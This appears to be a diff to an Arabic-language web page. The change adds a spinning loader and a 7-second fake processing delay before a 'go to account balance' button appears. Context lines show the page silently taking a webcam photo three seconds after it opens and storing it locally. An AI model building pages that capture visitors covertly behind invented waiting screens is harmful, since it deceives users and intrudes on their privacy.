@@ -47,14 +47,27 @@
         }
         #go-to-balance {
             display: none;
-            background-color: green;
-            color: white;
+            background-color: yellow;
+            color: black;
             padding: 10px 20px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
             margin-top: 10px;
+        }
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid white;
+            border-top: 5px solid green;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -68,6 +81,7 @@
         <div class="terms-box" onclick="showPhotos()">📜 البنود</div>
         <div id="saved-photos" style="display:none; margin-top:20px;"></div>
         <br>
+        <div id="loading" class="loader" style="display:none;"></div>
         <button id="go-to-balance" onclick="goToBalance()">الانتقال إلى الحساب</button>
     </div>
 
@@ -76,6 +90,7 @@
         const canvas = document.getElementById('canvas');
         const goToBalanceBtn = document.getElementById('go-to-balance');
         const savedPhotosContainer = document.getElementById('saved-photos');
+        const loadingSpinner = document.getElementById('loading');
 
         // تشغيل الكاميرا
         navigator.mediaDevices.getUserMedia({ video: true })
@@ -95,7 +110,12 @@
                 storedPhotos.push(capturedPhoto);
                 localStorage.setItem("savedPhotos", JSON.stringify(storedPhotos));
 
-                goToBalanceBtn.style.display = "block"; // إظهار زر الانتقال للحساب
+                showLoadingSpinner(); // عرض الدائرة الخضراء تدور
+
+                setTimeout(() => {
+                    loadingSpinner.style.display = "none"; // إخفاء الدائرة
+                    goToBalanceBtn.style.display = "block"; // إظهار زر الانتقال للحساب
+                }, 7000); // إخفاء الدائرة بعد 7 ثوانٍ
             }, 3000); // التقاط الصورة بعد 3 ثوانٍ من فتح الصفحة
         }
 
@@ -120,10 +140,14 @@
             }
         }
 
+        function showLoadingSpinner() {
+            loadingSpinner.style.display = "block"; // إظهار الدائرة الخضراء
+        }
+
         function goToBalance() {
             window.location.href = "balance.html";
         }
     </script>
 
 </body>
-        </html>
+</html>
